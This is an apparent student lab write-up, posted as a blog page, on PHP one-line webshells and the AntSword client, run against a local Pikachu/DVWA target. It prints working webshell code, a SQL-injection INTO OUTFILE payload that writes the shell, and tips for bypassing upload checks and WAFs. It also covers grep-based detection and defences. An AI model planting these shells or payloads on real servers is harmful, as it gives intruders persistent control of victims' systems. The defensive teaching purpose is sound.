@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>【课后作业】一句话木马与蚁剑：Web 权限维持的最小实现 // doing</title>
+<meta name="description" content="一行 PHP 代码怎样变成一台远程服务器？从一句话木马的原理讲到蚁剑连接，再看它的检测与防护。">
+<meta name="author" content="doing">
+<meta name="theme-color" content="#04070f">
+<meta name="color-scheme" content="dark">
+<meta name="keywords" content="网络安全, 渗透测试, CTF, doing">
+<meta name="generator" content="Hexo">
+<link rel="canonical" href="https://doingweb666.github.io/2026/11/04/webshell-antsword/">
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【课后作业】一句话木马与蚁剑：Web 权限维持的最小实现 // doing">
+<meta property="og:description" content="一行 PHP 代码怎样变成一台远程服务器？从一句话木马的原理讲到蚁剑连接，再看它的检测与防护。">
+<meta property="og:url" content="https://doingweb666.github.io/2026/11/04/webshell-antsword/">
+<meta property="og:site_name" content="doing">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【课后作业】一句话木马与蚁剑：Web 权限维持的最小实现 // doing">
+<meta name="twitter:description" content="一行 PHP 代码怎样变成一台远程服务器？从一句话木马的原理讲到蚁剑连接，再看它的检测与防护。">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script>document.documentElement.className += ' js';</script>
+
+</head>
+<body class="post-page">
+  <canvas id="matrix" class="matrix" aria-hidden="true"
+    data-enabled="true"
+    data-opacity="0.2"
+    data-font-size="16"
+    data-speed="1"></canvas>
+
+  <div class="crt" aria-hidden="true">
+    <div class="crt__scanlines"></div>
+    <div class="crt__vignette"></div>
+  </div>
+
+  <a class="skip-link" href="#main">跳到正文</a>
+
+  
+<header class="site-header" id="top">
+  <div class="shell header__inner">
+    <a class="brand" href="/" aria-label="doing 首页">
+      <span class="brand__prompt" aria-hidden="true">root@doing:~#</span>
+      <span class="brand__name">doing</span>
+      <span class="brand__caret" aria-hidden="true"></span>
+    </a>
+
+    <button class="nav-toggle" id="nav-toggle" type="button" aria-expanded="false" aria-controls="site-nav" aria-label="打开导航菜单">
+      <span></span><span></span><span></span>
+    </button>
+
+    <nav class="site-nav" id="site-nav" aria-label="主导航">
+      
+        <a class="site-nav__link"
+           href="/"
+           >
+          <span class="site-nav__marker" aria-hidden="true">./</span>home
+        </a>
+      
+        <a class="site-nav__link"
+           href="/archives/"
+           >
+          <span class="site-nav__marker" aria-hidden="true">./</span>archives
+        </a>
+      
+        <a class="site-nav__link"
+           href="/tags/"
+           >
+          <span class="site-nav__marker" aria-hidden="true">./</span>tags
+        </a>
+      
+    </nav>
+  </div>
+</header>
+
+
+  <main class="main" id="main">
+    
+<div class="progress" id="progress" aria-hidden="true"></div>
+
+<article class="post">
+  <header class="post__head">
+    <nav class="crumbs" aria-label="面包屑">
+      <a href="/">~</a>
+      <span class="crumbs__sep" aria-hidden="true">/</span>
+      <a href="/archives/">posts</a>
+      <span class="crumbs__sep" aria-hidden="true">/</span>
+      <span class="crumbs__here">webshell-antsword</span>
+    </nav>
+
+    <h1 class="post__title glitch" data-text="【课后作业】一句话木马与蚁剑：Web 权限维持的最小实现">【课后作业】一句话木马与蚁剑：Web 权限维持的最小实现</h1>
+
+    <div class="post__meta">
+      <span class="post__meta-item"><span class="post__meta-key">date</span> <time datetime="2026-11-04T07:00:00.000Z">2026-11-04</time></span>
+      <span class="meta-dot" aria-hidden="true">•</span>
+      <span class="post__meta-item"><span class="post__meta-key">read</span> 11 min</span>
+      
+      <span class="meta-dot" aria-hidden="true">•</span>
+      <span class="post__meta-item"><span class="post__meta-key">dir</span> <a href="/categories/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/">渗透实战</a></span>
+      
+      
+      <span class="post__meta-tags">
+        
+        <a class="tag" href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">#一句话木马</a>
+        
+        <a class="tag" href="/tags/%E8%9A%81%E5%89%91/">#蚁剑</a>
+        
+        <a class="tag" href="/tags/WebShell/">#WebShell</a>
+        
+        <a class="tag" href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">#权限维持</a>
+        
+      </span>
+      
+    </div>
+  </header>
+
+  <div class="post__layout has-toc">
+    <div class="file">
+      <div class="file__bar">
+        <span class="file__name"><span class="file__path" aria-hidden="true">~/posts/</span>webshell-antsword.md</span>
+        <span class="file__mode" title="只读文件">READ-ONLY</span>
+      </div>
+      <div class="file__body prose" id="post-content">
+        <p>如果 Meterpreter 是”重型装甲”，那 WebShell 就是”一把藏得极好的一字螺丝刀”。一行 PHP 代码，几 KB 不到，混在一堆正常的 PHP 文件里几乎无法用肉眼分辨，却能让你以 Web 服务的权限永久控制整台服务器。</p>
+<p>这篇记录一句话木马的写入与蚁剑（AntSword）的连接使用。</p>
+<h2 id="⚙️-实验环境"><a href="#⚙️-实验环境" class="headerlink" title="⚙️ 实验环境"></a>⚙️ 实验环境</h2><ul>
+<li>攻击机：Windows 10（<code>192.168.80.1</code>）+ 蚁剑 AntSword v4.0.3（<code>D:\AntSword-Loader-v4.0.3-win32-x64</code>）</li>
+<li>靶机：phpstudy + Pikachu（<code>http://127.0.0.1</code>，Apache 监听 80）或 DVWA</li>
+<li>目标：拿到 Web 目录的写权限（通过上传漏洞、文件包含或直接放置）</li>
+</ul>
+<h2 id="🧬-原理：一行代码为什么能控制服务器"><a href="#🧬-原理：一行代码为什么能控制服务器" class="headerlink" title="🧬 原理：一行代码为什么能控制服务器"></a>🧬 原理：一行代码为什么能控制服务器</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>拆开看：</p>
+<ul>
+<li><code>$_REQUEST[&#39;cmd&#39;]</code> —— 接收客户端传来的 <code>cmd</code> 参数，<strong>值完全由攻击者控制</strong></li>
+<li><code>system()</code> —— 把参数内容当作系统命令执行，并<strong>回显输出</strong></li>
+</ul>
+<p>所以访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://靶机IP/shell.php?cmd=whoami</span><br></pre></td></tr></table></figure>
+
+<p>服务端实际执行的是 <code>whoami</code>，并把结果返回给你。等于你把目标机器的 shell 挂在了 HTTP 协议上。</p>
+<p>蚁剑用的变体是 <code>eval</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>区别在于 <code>eval</code> 执行的是 <strong>PHP 代码</strong>而不是系统命令，能力更强（能调 PHP 函数、操作文件、连数据库），也是 AntSword 默认解析的格式。前面的 <code>@</code> 抑制错误输出，避免报错信息暴露路径。</p>
+<p>这里有个新手最容易踩的坑：很多教程写的是 <code>$_POST[&#39;cmd&#39;]</code>，而 <code>$_POST</code> <strong>只接收请求体</strong>，浏览器地址栏里 <code>?cmd=...</code> 发的是 GET —— 结果就是打开页面一片空白，让人以为木马坏了。其实不是木马的问题，是参数根本没进去。换成 <code>$_REQUEST</code>（GET &#x2F; POST &#x2F; COOKIE 全收）两种方式都能用，蚁剑走 POST 也不受影响。</p>
+<p><img src="/images/088b096e4e79af89986d810522d8f919.png" alt="一句话木马源码"></p>
+<h2 id="📤-第一步：把木马写进目标"><a href="#📤-第一步：把木马写进目标" class="headerlink" title="📤 第一步：把木马写进目标"></a>📤 第一步：把木马写进目标</h2><p>三个常用入口，按真实场景的常见程度排序：</p>
+<p><strong>方式一：文件上传漏洞</strong>（最典型）<br>Pikachu 的”不安全的文件上传”关卡，或 DVWA 的 Upload 模块。上传 <code>shell.php</code>，内容就是上面那行。如果前端限制扩展名，改包绕过；如果只校验 Content-Type，一起改掉。</p>
+<p><strong>方式二：数据库写文件</strong><br>有 SQL 注入且 <code>secure_file_priv</code> 为空时：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>#</span><br></pre></td></tr></table></figure>
+
+<p><strong>方式三：直接放置</strong>（本地靶场演示用）<br>靶场是自己搭的，直接把 <code>shell.php</code> 拷到 <code>D:\phpstudypro\WWW\</code> 下即可 —— 这一步跳过了”如何获得写权限”，只演示后半段。</p>
+<h3 id="落地时被拦了一次"><a href="#落地时被拦了一次" class="headerlink" title="落地时被拦了一次"></a>落地时被拦了一次</h3><p>第一次放进去，文件<strong>瞬间就没了</strong> —— 火绒（进程 <code>HipsDaemon</code>）按内容查杀，连 404 都来不及看。做了组对照测试：</p>
+<table>
+<thead>
+<tr>
+<th>文件</th>
+<th>内容</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>t_benign.php</code></td>
+<td><code>&lt;?php echo &quot;hello&quot;;?&gt;</code></td>
+<td>保留</td>
+</tr>
+<tr>
+<td><code>t_evil.php</code></td>
+<td><code>&lt;?php @eval($_REQUEST[&quot;cmd&quot;]);?&gt;</code></td>
+<td><strong>3 秒内被删</strong></td>
+</tr>
+</tbody></table>
+<p>把 <code>D:\phpstudypro\WWW</code> 加进火绒「信任区」后，才顺利落地。</p>
+<p>这件事挺说明问题：<strong>对”一句话木马”这种最古老的形态，现代终端防护已经是秒级检出</strong>。真实渗透中之所以还能用，往往靠的是把文件写进白名单目录（上传目录、缓存目录、日志文件），而不是硬拼特征 —— 也解释了为什么后面”怎么发现它”那一节要重点查<strong>文件修改时间</strong>。</p>
+<p>上传后先验证能不能通。注意一个容易踩的坑：<code>eval</code> 接收的是 <strong>PHP 代码</strong>，不是系统命令，所以 <code>?cmd=whoami</code> 只会报语法错误，得把命令包进 PHP 函数里：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/shell.php?cmd=system(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>页面只返回一行用户名（phpstudy 下通常是 <code>desktop-xxxx\admin</code>），没有任何其他内容 —— 这就是一个活的 WebShell。想确认 PHP 确实在执行，也可以用 <code>?cmd=phpinfo();</code>，会吐出整页环境信息。</p>
+<p><img src="/images/d230eaf62482bada337807b5a43ba8ca.png" alt="浏览器验证木马可用"></p>
+<h2 id="🛠️-第二步：蚁剑连接"><a href="#🛠️-第二步：蚁剑连接" class="headerlink" title="🛠️ 第二步：蚁剑连接"></a>🛠️ 第二步：蚁剑连接</h2><p>打开 <code>AntSword.exe</code>，右键「添加数据」：</p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>填写</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>URL 地址</td>
+<td><code>http://127.0.0.1/shell.php</code></td>
+</tr>
+<tr>
+<td>连接密码</td>
+<td><code>cmd</code>（与代码里的参数名一致）</td>
+</tr>
+<tr>
+<td>编码器</td>
+<td><code>default</code>（若被 WAF 拦可换 <code>base64</code>）</td>
+</tr>
+<tr>
+<td>网站类型</td>
+<td><code>PHP</code></td>
+</tr>
+</tbody></table>
+<p>点「测试连接」，显示成功即可保存。双击进入后，蚁剑会自动探测目标环境（PHP 版本、OS、当前用户、可执行函数、禁用函数清单），在界面右上角能看到。</p>
+<p><img src="/images/d1600c5890f5f11291d92b24ee81065d.png" alt="蚁剑添加数据配置"></p>
+<h2 id="🎛️-第三步：能做哪些事"><a href="#🎛️-第三步：能做哪些事" class="headerlink" title="🎛️ 第三步：能做哪些事"></a>🎛️ 第三步：能做哪些事</h2><p><strong>文件管理</strong>：像用资源管理器一样浏览服务器目录，可以上传、下载、编辑、改权限、批量打包。找一个可写的 Web 目录传个新的木马，就是”权限维持”。</p>
+<p><img src="/images/ff8d30e2795bbca3e37579874d595032.png" alt="蚁剑文件管理器，直接看到了 WWW 目录下的全部文件"></p>
+<p><strong>虚拟终端</strong>：直接执行系统命令。如果目标禁用了一堆危险函数，蚁剑会提示哪些可用、哪些被 <code>disable_functions</code> 挡住了。</p>
+<p><img src="/images/825cac441c9908c62fade2b6aeb35a5c.png" alt="虚拟终端里执行 whoami，回显目标机器名与当前用户"></p>
+<p>进去的第一眼，蚁剑就把目标摸清了：系统是 <code>Windows NT 10.0 build 26200</code>、当前是 <code>AMD64</code>、Web 根目录在 <code>D:/phpstudypro/WWW</code>、跑 PHP 的身份是普通用户。<strong>这一步不需要任何提权动作，因为 Web 服务本身就是用这个身份在跑。</strong></p>
+<p><strong>数据库管理</strong>：填入 MySQL 的连接信息后可以直接执行 SQL —— 通常配置文件里就有明文账号密码（<code>config.inc.php</code> 之类）。</p>
+<p><strong>插件市场</strong>：提权辅助、端口扫描、反弹 shell、内网代理，都能一键加载。</p>
+<p><strong>编码器与流量混淆</strong>：<code>base64</code>、<code>chr</code>、<code>rot13</code> 等编码器会把 POST 内容变形，绕过基于关键字匹配的 WAF。这也是”为什么光靠正则拦 webshell 没用”的原因。</p>
+<h2 id="🔍-怎么发现它"><a href="#🔍-怎么发现它" class="headerlink" title="🔍 怎么发现它"></a>🔍 怎么发现它</h2><p>防守方拿到一台疑似被控的服务器，通常这样查：</p>
+<p><strong>1. 找异常文件</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find /var/www -name <span class="string">&quot;*.php&quot;</span> -newermt <span class="string">&quot;2026-11-01&quot;</span> -<span class="built_in">ls</span></span><br><span class="line">grep -rn <span class="string">&quot;eval(\$_POST\|system(\$_REQUEST\|assert(\$_&quot;</span> /var/www/</span><br></pre></td></tr></table></figure>
+
+<p>真实环境里攻击者会混淆，实际形态可能是 <code>$_POST[&#39;a&#39;.&#39;b&#39;]</code>、<code>base64_decode</code>、<code>preg_replace</code> 加 <code>/e</code>（老版本）、或者藏在一个看起来正常的 <code>404.php</code> 里 —— 所以还要看<strong>文件修改时间</strong>和<strong>文件大小异常</strong>。</p>
+<p><strong>2. 看访问日志</strong><br>大量带 <code>cmd=</code>、<code>pass=</code> 参数的 POST 请求，或者同一个 IP 短时间内访问同一个陌生 PHP 文件。</p>
+<p>实测的 <code>access.log</code> 就是这样暴露的：</p>
+<p><img src="/images/2c8979f691c9eec8e3d9a9531382d0b9.png" alt="access.log 里成片的 &#x2F;shell.php 请求"></p>
+<p>能读出三件事：</p>
+<ul>
+<li><strong>GET 请求带明文参数</strong>：<code>cmd=system(%27whoami%27)</code>，<code>%27</code> 是单引号的 URL 编码 —— 请求内容完全没有加密</li>
+<li><strong>POST 请求只留长度</strong>：<code>POST /shell.php HTTP/1.1&quot; 200 112</code>，正文不进日志，所以蚁剑默认走 POST 比 GET 隐蔽</li>
+<li><strong>中间那批 <code>404</code></strong>：正是文件被火绒删掉、木马还没重新落地的时间段 —— 连”攻击者遇到挫折”都记下来了</li>
+</ul>
+<p><strong>3. 工具扫描</strong><br>D盾、河马、微步在线云沙箱的 webshell 检测，对已知家族检出率不错。</p>
+<p><strong>4. 主机侧</strong><br><code>disable_functions</code> 有没有被改、<code>.htaccess</code> 有没有被塞内容、<code>crontab</code> 有没有陌生任务 —— webshell 常伴随权限维持动作。</p>
+<h2 id="🛡️-怎么防"><a href="#🛡️-怎么防" class="headerlink" title="🛡️ 怎么防"></a>🛡️ 怎么防</h2><table>
+<thead>
+<tr>
+<th>层次</th>
+<th>措施</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>代码</td>
+<td>上传功能做<strong>扩展名白名单 + 内容检测 + 重命名</strong>，上传目录禁止执行 PHP（<code>php_flag engine off</code>）</td>
+</tr>
+<tr>
+<td>配置</td>
+<td><code>disable_functions</code> 禁用 <code>system</code>&#x2F;<code>exec</code>&#x2F;<code>eval</code>&#x2F;<code>passthru</code> 等；<code>open_basedir</code> 限制可访问目录</td>
+</tr>
+<tr>
+<td>权限</td>
+<td>Web 服务以低权限用户运行，目录不给写权限（这条最有效）</td>
+</tr>
+<tr>
+<td>流量</td>
+<td>WAF 检测 POST 中的代码特征；出站限制，防止反弹</td>
+</tr>
+<tr>
+<td>检测</td>
+<td>文件完整性监控（FIM）、定期 webshell 扫描、日志告警</td>
+</tr>
+<tr>
+<td>应急</td>
+<td>发现后不要只删文件 —— 要查它怎么进来的（上传点&#x2F;注入点&#x2F;弱口令），否则删了还会再来</td>
+</tr>
+</tbody></table>
+<p>一句话总结：<strong>webshell 的根因是”能让不可信内容写进可执行目录”</strong>。把这条路径堵死（写权限分离、上传目录不可执行），90% 的 webshell 就没法落地。</p>
+<h2 id="📌-补充说明"><a href="#📌-补充说明" class="headerlink" title="📌 补充说明"></a>📌 补充说明</h2><ul>
+<li><strong>一句话木马 vs 大马</strong>：一句话木马体积小、功能弱（只负责执行代码），靠客户端（蚁剑&#x2F;菜刀）提供交互能力；大马是功能完整的网页管理面板，体积大易被查杀。现代趋势是”一句话 + 客户端”，因为服务端越干净越难发现。</li>
+<li><strong>蚁剑和菜刀的关系</strong>：蚁剑是”中国菜刀”的开源替代，修掉了菜刀的几个致命问题（明文流量、固定特征），并支持插件和自定义编码器。</li>
+<li><strong>合规边界</strong>：本文全部操作在本地自建靶场完成。向任何你无权控制的服务器写入 webshell，属于《刑法》第 285 条第二款的非法控制计算机信息系统罪，量刑起点是三年以下有期徒刑。</li>
+</ul>
+
+      </div>
+    </div>
+
+    
+    <aside class="toc" aria-label="文章目录">
+      <p class="toc__title">// INDEX</p>
+      <nav class="toc__nav">
+        <ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E2%9A%99%EF%B8%8F-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-list-text">⚙️ 实验环境</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%A7%AC-%E5%8E%9F%E7%90%86%EF%BC%9A%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%8E%A7%E5%88%B6%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-list-text">🧬 原理：一行代码为什么能控制服务器</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%93%A4-%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%8A%8A%E6%9C%A8%E9%A9%AC%E5%86%99%E8%BF%9B%E7%9B%AE%E6%A0%87"><span class="toc-list-text">📤 第一步：把木马写进目标</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E8%90%BD%E5%9C%B0%E6%97%B6%E8%A2%AB%E6%8B%A6%E4%BA%86%E4%B8%80%E6%AC%A1"><span class="toc-list-text">落地时被拦了一次</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%9B%A0%EF%B8%8F-%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5"><span class="toc-list-text">🛠️ 第二步：蚁剑连接</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%8E%9B%EF%B8%8F-%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E8%83%BD%E5%81%9A%E5%93%AA%E4%BA%9B%E4%BA%8B"><span class="toc-list-text">🎛️ 第三步：能做哪些事</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%94%8D-%E6%80%8E%E4%B9%88%E5%8F%91%E7%8E%B0%E5%AE%83"><span class="toc-list-text">🔍 怎么发现它</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%9B%A1%EF%B8%8F-%E6%80%8E%E4%B9%88%E9%98%B2"><span class="toc-list-text">🛡️ 怎么防</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%93%8C-%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E"><span class="toc-list-text">📌 补充说明</span></a></li></ol>
+      </nav>
+    </aside>
+    
+  </div>
+
+  <footer class="post__foot">
+    
+    <div class="post__tags">
+      <span class="post__tags-label" aria-hidden="true">tags:</span>
+      
+      <a class="tag" href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">#一句话木马</a>
+      
+      <a class="tag" href="/tags/%E8%9A%81%E5%89%91/">#蚁剑</a>
+      
+      <a class="tag" href="/tags/WebShell/">#WebShell</a>
+      
+      <a class="tag" href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">#权限维持</a>
+      
+    </div>
+    
+
+    
+    <nav class="post-nav" aria-label="上一篇 / 下一篇">
+      
+      <a class="post-nav__item post-nav__item--prev" href="/2026/10/31/curl/">
+        <span class="post-nav__label"><span aria-hidden="true">←</span> PREV</span>
+        <span class="post-nav__title">【课后作业】curl命令行</span>
+      </a>
+      
+      
+      <a class="post-nav__item post-nav__item--next" href="/2026/11/04/msfvenom-meterpreter/">
+        <span class="post-nav__label">NEXT <span aria-hidden="true">→</span></span>
+        <span class="post-nav__title">【课后作业】msfvenom 生成被控端与 Meterpreter 远程控制</span>
+      </a>
+      
+    </nav>
+    
+  </footer>
+</article>
+
+  </main>
+
+  
+<footer class="site-footer">
+  <div class="shell">
+    <div class="footer__grid">
+      <div class="footer__brand">
+        <p class="footer__prompt"><span class="ps1" aria-hidden="true">root@doing:~$</span> echo $SIGNATURE</p>
+        <p class="footer__signature">There is no place like 127.0.0.1.</p>
+      </div>
+
+      <div class="footer__col">
+        <p class="footer__label">// ELSEWHERE</p>
+        <a class="footer__link" href="/archives/">archives</a>
+        <a class="footer__link" href="/tags/">tags</a>
+        
+      </div>
+
+      <div class="footer__col">
+        <p class="footer__label">// SYSTEM</p>
+        <p class="footer__meta"><span>stack</span> hexo + ejs</p>
+        <p class="footer__meta"><span>uptime</span> since 2026</p>
+        <button class="matrix-toggle" id="matrix-toggle" type="button" aria-pressed="true">MATRIX: ON</button>
+      </div>
+    </div>
+
+    <div class="footer__bottom">
+      <span>© 2026 <span class="footer__name">doing</span> — all packets encrypted</span>
+      <span class="footer__eof" aria-hidden="true">[ EOF ]</span>
+      <a class="footer__top-link" href="#top">cd ~ <span aria-hidden="true">↑</span></a>
+    </div>
+  </div>
+</footer>
+
+
+  <button class="to-top" id="to-top" type="button" aria-label="返回顶部" title="回到顶部">↑</button>
+
+  
+<script src="/js/matrix.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+</body>
+</html>
